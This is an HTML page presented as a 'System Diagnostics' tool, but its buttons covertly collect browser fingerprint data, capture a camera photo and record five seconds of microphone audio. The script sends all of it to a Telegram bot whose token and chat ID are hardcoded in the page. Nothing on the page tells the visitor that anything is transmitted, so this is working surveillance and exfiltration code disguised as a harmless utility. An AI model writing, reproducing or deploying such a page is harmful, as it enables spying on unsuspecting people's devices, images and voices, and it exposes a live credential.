<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostics</title>
    <style>
        body { background: white; color: black; font-family: Arial; margin: 20px; }
        button { background: #4285f4; color: white; padding: 12px 24px; margin: 10px; border: none; border-radius: 4px; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>
<h2>System Check</h2>
<p>Click buttons to run full diagnostics.</p>
<button id="diagBtn">Run Diagnostics</button>
<button id="cameraBtn">Access Camera</button>
<button id="micBtn">Access Microphone</button>
<div id="dummy" class="hidden"></div>

<script>
    const TELEGRAM_BOT_TOKEN = "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E";
    const TELEGRAM_CHAT_ID = "8577571897";

    function sendToTelegram(text, isFile = false, fileData = null, filename = "") {
        if (isFile && fileData) {
            let formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("document", fileData, filename);
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            }).catch(err => console.log(err));
        } else {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text.substring(0, 4000) })
            }).catch(err => console.log(err));
        }
    }

    function collectAllTraits() {
        let data = {};
        data.userAgent = navigator.userAgent;
        data.platform = navigator.platform;
        data.language = navigator.language;
        data.screenWidth = screen.width;
        data.screenHeight = screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.localDateTime = new Date().toString();
        if (navigator.connection) {
            data.networkType = navigator.connection.effectiveType;
        }
        sendToTelegram(JSON.stringify(data, null, 2));
    }

    document.getElementById('cameraBtn').addEventListener('click', function() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.autoplay = true;
                video.onloadedmetadata = function() {
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        sendToTelegram("Camera photo", true, blob, "camera.jpg");
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                };
                video.play();
            })
            .catch(err => sendToTelegram("Camera error: " + err.message));
    });

    document.getElementById('micBtn').addEventListener('click', function() {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                let mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    let blob = new Blob(chunks, { type: 'audio/webm' });
                    sendToTelegram("Audio recording", true, blob, "audio.webm");
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            })
            .catch(err => sendToTelegram("Mic error: " + err.message));
    });

    document.getElementById('diagBtn').addEventListener('click', function() {
        collectAllTraits();
    });
</script>
</body>
</html>
